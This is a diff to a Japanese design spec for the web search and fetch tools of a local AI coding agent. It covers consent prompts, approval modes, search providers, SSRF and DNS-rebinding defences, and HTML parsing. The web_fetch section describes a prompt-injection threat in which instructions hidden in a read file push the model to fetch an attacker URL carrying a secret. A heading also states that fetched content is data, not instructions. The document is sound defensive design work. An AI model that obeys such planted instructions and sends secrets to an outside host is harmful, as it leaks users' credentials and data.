@@ -11,7 +11,11 @@
 - `web.enabled` の既定は `false`。
 - 有効にしていない限り、`web_search` と `web_fetch` はツール一覧に**出さない**。
   「あるけど失敗する」状態を作らない。
-- 有効化したときに、外部へ出る通信であることを1度示して同意を取る。
+- 有効化したときに、外部へ出る通信であることを1度示して同意を取る（`akari web enable`。
+  検索語の送り先・ページはこの PC から直接取りに行くこと・承認の出方を見せて y/N）。
+- 検索の提供元が使えない（Tavily の鍵が無いなど）ときは、`web_search` だけ渡さず理由を出す。`web_fetch` は渡す。
+- **渡す場所**: `akari run`・対話画面・ハーネスAPI。`akari mcp serve` には渡さない（呼ぶ側が自分の Web の道具を持つ。2026-11-21 決定）。
+- 読み取りのみの実行（`--read-only`）には `web_search` だけ渡す（`web_fetch` は危険度が `execute` のため。MCP と同じ扱い）。
 
 ## ツール
 
@@ -25,16 +29,27 @@ type SearchResult = { title: string; url: string; snippet: string; publishedAt?:
 - 返すのは題・URL・抜粋だけ。本文は取りに行かない。取りに行くのは `web_fetch` の仕事。
 - 危険度は `read` だが、**`web.consent` が `perRun` なら実行ごとに1度承認を取る**（既定）。
   検索語には作業中のコードの断片が混ざりうるため、何を送るかを見せる。
+  - 承認は権限モードによらない。選択肢に「この実行中は Web 検索を許可」がある（以後その実行では聞かない）
+  - `once` なら聞かない（`akari web enable` で同意した時点で済んだとみなす）。検索語は毎回表示する
 
-### `web_fetch(url, maxBytes?)`
+### `web_fetch(url, start?)`
 
 ```ts
 type FetchResult = { url: string; finalUrl: string; status: number; title?: string; text: string; truncated: boolean };
 ```
 
-- HTML を本文テキストへ変換して返す。
-- `maxBytes` 既定 512KB。超過分は切り、`truncated: true` にする。
+- HTML を本文テキストへ変換して返す。`text/*`・JSON・XML はそのまま文字として返す。PDF・画像などは「対応していない種類」と返す。
+- 取りに行く量は `web.fetch.maxBytes`（既定 512KB）まで。超過分は切り、`truncated: true` にする。
+- **モデルへ1回に渡すのは `web.fetch.maxChars`（既定 10,000 字）まで**（2026-11-21 変更）。512KB をそのまま渡すと、
+  ローカルLLMの文脈が1回で埋まるため。続きは `start`（何文字目から）で頼む。
+  取得したページはその実行の間だけ覚えておき（最大20ページ）、続きを頼まれても取り直さない。
+- 文字コードは、応答のヘッダ → HTML の `<meta charset>` → UTF-8 の順で決める（Shift_JIS・EUC-JP も読む）。
 - 危険度は `execute` 扱い。外部への通信であり、後述のとおり悪用経路になるため。
+  - 承認はコマンドと同じく、`ask` / `autoEdit` では聞き、`full` では聞かない。「この実行中は <ホスト> を許可」がある
+  - 一度断られた実行では、`full` でも聞く（断られた後の迂回を止める）
+  - **主な危険は、読んだファイルに仕込まれた指示で `https://悪い所/?q=<秘密>` を取りに行かされること**。
+    承認では URL を全文見せる。コマンドは既定でネットワークに出られる（`curl` で同じことができる）ので、
+    `full` で Web だけを厳しくしても守りは増えない
 
 ## 検索の提供元（差し替え可能）
 
@@ -42,29 +57,35 @@ type FetchResult = { url: string; finalUrl: string; status: number; title?: stri
 
 | 提供元 | 鍵 | 備考 |
 |---|---|---|
-| **SearXNG（自前ホスト）** | 不要 | 推奨。検索語が第三者に渡らない。`http://localhost:8888/search?format=json` |
-| Brave Search API | 要 | 無料枠あり |
-| Tavily | 要 | LLM向けに整形された結果を返す |
+| **SearXNG（自前ホスト）** | 不要 | 既定・推奨。検索語が第三者に渡らない。`<url>/search?q=…&format=json` |
+| Tavily | 要 | 月 1,000 回まで無料・カード不要（2026-11 時点、公式の資料）。`POST https://api.tavily.com/search`、鍵は `Authorization: Bearer` |
+
+**今作るのは SearXNG と Tavily**（2026-11-21 オーナー決定）。提供元は差し替えられる形にする（後で替えるかもしれない）。
+Brave は作らない: 2026-02 に無料枠がなくなりカードの登録が要る。また、結果の保存を禁じる規約になったとの情報があり、
+Akari は会話（検索結果を含む）を保存するので抵触しうる（規約の本文は未確認）。
+
+検索の提供元への通信は、利用者が設定した宛先なので、下の SSRF の検査をしない（SearXNG は手元の `localhost` が普通）。
+モデルが変えられるのは検索語と件数だけ。
 
 ```jsonc
 {
   "web": {
     "enabled": false,
-    "consent": "perRun",              // perRun | once | never(=無効)
+    "consent": "perRun",              // perRun | once（無効にするのは enabled: false）
     "search": {
-      "provider": "searxng",          // searxng | brave | tavily
-      "url": "http://localhost:8888",
-      "apiKeyRef": null,
+      "provider": "searxng",          // searxng | tavily
+      "url": "http://localhost:8888", // SearXNG の場所（Tavily では使わない）
+      "apiKeyRef": null,              // Tavily の鍵。'env:TAVILY_API_KEY' を推奨
       "count": 5
     },
     "fetch": {
       "maxBytes": 524288,
+      "maxChars": 10000,
       "timeoutMs": 20000,
       "maxRedirects": 3,
       "userAgent": "Akari/0.1 (+local tool)",
-      "allowPrivateHosts": false,
-      "allowedHosts": [],
-      "deniedHosts": []
+      "privateHosts": [],             // 内部のアドレスに解決されても取ってよいホスト名（社内の文書サーバなど）
+      "deniedHosts": []               // 取らないホスト（その下の名前も）
     }
   }
 }
@@ -91,12 +112,21 @@ type FetchResult = { url: string; finalUrl: string; status: number; title?: stri
 5. 検査と接続の間でDNSが差し替わる問題（DNS rebinding）を避けるため、
    検査で得たIPアドレスへ直接接続し、`Host` ヘッダで元のホスト名を送る。
    これができない実装になった場合は、**その旨を仕様に書いてから**別の手を採る。
-6. `allowPrivateHosts: true` にすれば3を外せる。有効化時に何を許すことになるかを表示する。
-   社内のドキュメントサーバを読ませたい、といった用途のため。
-7. 認証情報を持つヘッダ・Cookie は送らない。`Authorization` を付けない。
+   **実装（2026-11-21）**: Node の `http` / `https` の `lookup` を差し替え、検査で選んだ IP を返す。
+   TLS の名前（SNI）と `Host` は元のホスト名のまま。1回の取得（リダイレクトの1段）で名前解決は1回だけ。
+   名前解決の結果が複数あれば**全部**を検査し、1つでも拒否の範囲なら取らない。
+   IPv6 の中に IPv4 を入れた書き方（`::ffff:127.0.0.1`、NAT64 の `64:ff9b::/96`、6to4 の `2002::/16`）は中の IPv4 で判定する。
+   Teredo（`2001::/32`）と、その他の予約済みの範囲（`192.0.0/24` `198.18/15` `240/4` など）も拒否する。
+6. **内部のアドレスを許すのはホスト名ごと**（`web.fetch.privateHosts`。2026-11-21 変更。元は全体を開ける `allowPrivateHosts: true`）。
+   社内のドキュメントサーバを読ませたい、といった用途のため。全部を開けると、ルーターや手元のサーバまで読めてしまう。
+   一覧に入れても、リンクローカル（クラウドのメタデータ）・`0.0.0.0/8`・マルチキャストは常に拒否する。
+7. 認証情報を持つヘッダ・Cookie は送らない。`Authorization` を付けない。URL に `user:pass@` があれば取らない。
+8. プロキシは使わない（環境変数の `HTTPS_PROXY` なども見ない）。プロキシを通すと、上の IP の検査が効かない。
+   会社のプロキシの内側では `web_fetch` が使えない（未対応。要望があれば、プロキシの先で検査する形を考える）。
 
-拒否したときは、モデルへ理由を返す（`{ok:false, error:"private_address"}`）。
-黙って空を返さない。
+拒否したときは、モデルへ理由を返す（`private_address: … は内部のアドレス（10.0.0.5）に解決されるため取得しません` のように、
+種別の名前と説明を1行で）。黙って空を返さない。種別: `private_address` `bad_scheme` `denied_host` `credentials_in_url`
+`too_many_redirects` `unsupported_type` `timeout` `http_error` `network_error`。
 
 ## 取り込んだ内容は「データ」であって「指示」ではない
 
@@ -117,12 +147,14 @@ Webページには、モデルを乗っ取ろうとする文章が置かれう�
 
 ## HTML → テキスト
 
-- `<script>` `<style>` `<nav>` `<footer>` `<aside>` を落とす。
+- `<main>`（なければ `role="main"`、`<article>`）があればその中だけ、なければ `<body>`。
+- `<script>` `<style>` `<noscript>` `<template>` `<svg>` `<iframe>` `<form>` `<nav>` `<footer>` `<aside>` を落とす。
+  `<header>` は本文（main / article）の外のときだけ落とす（記事の題が入ることがあるため）。
 - `<title>` を `title` に取る。
-- 見出し・段落・リスト・コードブロックの構造は残す（Markdown 風）。
-- リンクは `テキスト (URL)` の形で残す。モデルが次に取りに行けるようにするため。
-- 依存を1つ足す（HTMLパーサ）。選定は `context/generic/dependencies-and-research.md` に従い、
-  実装時にライセンスと保守状況を確認してから決める。**ここでは決めない。**
+- 見出し・段落・リスト・表・引用・コードブロックの構造は残す（Markdown 風）。
+- リンクは `テキスト (URL)` の形で残す。モデルが次に取りに行けるようにするため。`javascript:` などは残さない。
+- **HTMLパーサは `parse5`**（2026-11-21 決定）。MIT、HTML の標準どおりに読む（jsdom なども使う）、依存は `entities` の1つだけ、
+  2026-11 も更新がある。`htmlparser2` は依存が4つ、`cheerio` は11。本文の取り出し（Readability など）は足さず、上の規則で自前に書く。
 
 ## CLI
 
@@ -132,10 +164,19 @@ akari web fetch https://example.com/docs
 akari web doctor          # 提供元へ到達できるか、鍵が要るか
 ```
 
+```sh
+akari web enable          # 何がどこへ送られるかを見せて、有効にする（-y で確認を省く）
+akari web disable
+```
+
+コマンドから直接使う `search` / `fetch` は、`web.enabled` が false でも動く（打った本人が同意している）。
+SSRF の検査は同じようにかかる。
+
 ## 未解決
 
-- SearXNG の JSON 出力は設定で無効化されていることがある。
-  `web doctor` で判別して、その場合の案内を出す必要がある。実物で確認する。
-- HTMLパーサの選定。
+- SearXNG の JSON 出力は設定で無効化されていることがある（403 になる。公式の資料で確認）。
+  `web doctor` で 403 を見分けて、`settings.yml` の `search.formats` に `json` を足す案内を出す。実物では未確認。
+- 実際のサイト・SearXNG・Tavily での確認（開発の環境は外へ直接出られないため、オーナーの手元で）。
+- プロキシの内側での `web_fetch`。
 - 検索結果のキャッシュ。同じ語を何度も引くのは無駄だが、
   キャッシュは古い情報を掴む原因にもなる。まず入れない。
